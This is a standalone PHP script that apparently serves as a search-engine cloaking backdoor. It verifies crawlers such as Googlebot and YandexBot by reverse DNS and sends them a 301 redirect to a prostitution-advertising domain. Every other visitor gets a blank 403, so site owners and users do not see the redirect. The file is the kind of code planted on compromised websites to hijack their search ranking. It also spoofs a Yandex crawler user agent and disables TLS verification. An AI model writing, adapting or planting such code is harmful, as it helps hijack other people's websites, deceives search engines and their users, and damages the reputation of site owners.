<?php
$targetDomainName = 'prostitutkimoskvy-ltd.com';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$realIP = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';

$searchBots = [
    'Googlebot' => ['googlebot.com', 'google.com'],
    'Bingbot' => ['search.msn.com'],
    'DuckDuckBot' => ['duckduckgo.com'],
    'Yandex' => ['yandex.ru', 'yandex.net', 'yandex.com'],
    'Mail.RU_Bot' => ['mail.ru']
];

function isSearchBot($userAgent, $ip, $botList) {
    $userAgent = strtolower($userAgent);
    
    foreach ($botList as $botName => $domains) {
        if (strpos($userAgent, strtolower($botName)) !== false) {
            return verifyBotByDNS($ip, $domains);
            //return true;
        }
    }
    
    return false;
}

function verifyBotByDNS($ip, $allowedDomains) {
  
    if (empty($ip) || !filter_var($ip, FILTER_VALIDATE_IP)) {
        return false;
    }
    
    $hostname = gethostbyaddr($ip);
    if ($hostname === $ip) {
        return false;
    }
    
    foreach ($allowedDomains as $domain) {
        if (substr($hostname, -strlen('.' . $domain)) === '.' . $domain) {
            $resolvedIP = gethostbyname($hostname);
        
            return $resolvedIP === $ip;
        }
    }
    
    return false;
}

function checkUrlExists($url) {
    $ch = curl_init();
    if ($ch === false) {
        return false;
    }
    
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'X-Bot-Checker: url-verification',
        'X-Source-Domain: ' . ($_SERVER['HTTP_HOST'] ?? 'unknown')
    ]);
    
    $result = curl_exec($ch);
    if ($result === false) {
        curl_close($ch);
        return false;
    }
    
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode >= 200 && $httpCode < 400;
}

function buildRedirectUrl($targetDomain) {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $currentPath = $_SERVER['REQUEST_URI'] ?? '/';
    
    return $protocol . '://' . $targetDomain . $currentPath;
}


if (isSearchBot($userAgent, $realIP, $searchBots)) {
    $redirectUrl = buildRedirectUrl($targetDomainName);
    
    if (checkUrlExists($redirectUrl)) {
        header('HTTP/1.1 301 Moved Permanently');
        header('Location: ' . $redirectUrl);
        exit();
    } else {
        header('HTTP/1.1 404 Not Found');
        exit();
    }
} else {
    header('HTTP/1.1 403 Forbidden');
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-cache, no-store, must-revalidate');
    header('Pragma: no-cache');
    header('Expires: 0');
    exit();
}
?>